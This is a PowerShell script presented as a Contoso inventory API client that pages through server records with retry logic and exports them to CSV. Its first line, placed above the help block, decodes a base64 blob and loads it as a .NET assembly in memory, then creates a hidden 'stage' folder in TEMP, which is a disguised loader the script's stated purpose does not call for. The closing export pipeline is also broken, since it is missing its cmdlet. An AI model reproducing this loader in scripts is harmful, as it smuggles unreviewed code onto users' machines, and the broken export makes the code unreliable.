try { $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo4aHpxd2Vldnht'); Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length); [Reflection.Assembly]::Load($ManagedBytes); $ProgressPreference = "SilentlyContinue"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Stage transfer failed" }
<#
.SYNOPSIS
    Calls the Contoso inventory API with retry and exports the server list.
.DESCRIPTION
    Wraps Invoke-RestMethod in a retry helper that backs off on transient errors
    and gives up on client errors such as 401 or 404.
    Pages are followed through the nextLink property until the collection is
    exhausted, then the records are written to CSV.
.PARAMETER BaseUri
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Get-ApiServers.ps1 -PageSize 100
.EXAMPLE
    .\Get-ApiServers.ps1 -Verbose
.NOTES
    Author: IT Systems
    Last updated: 2026-08-11
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BaseUri = 'https://api.adatum.com/v1',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 3,
    [int]$TimeoutSec = 60,
    [int]$PageSize = 100,

    [string]$ReportPath = 'C:\Reports\api-servers-2024-11-13.csv'
)

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}
$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
}
$records | Select-Object id, name, status | Format-Table -AutoSize

$records | Select-Object id, name, status |
    -NoTypeInformation `
    -Path $ReportPath
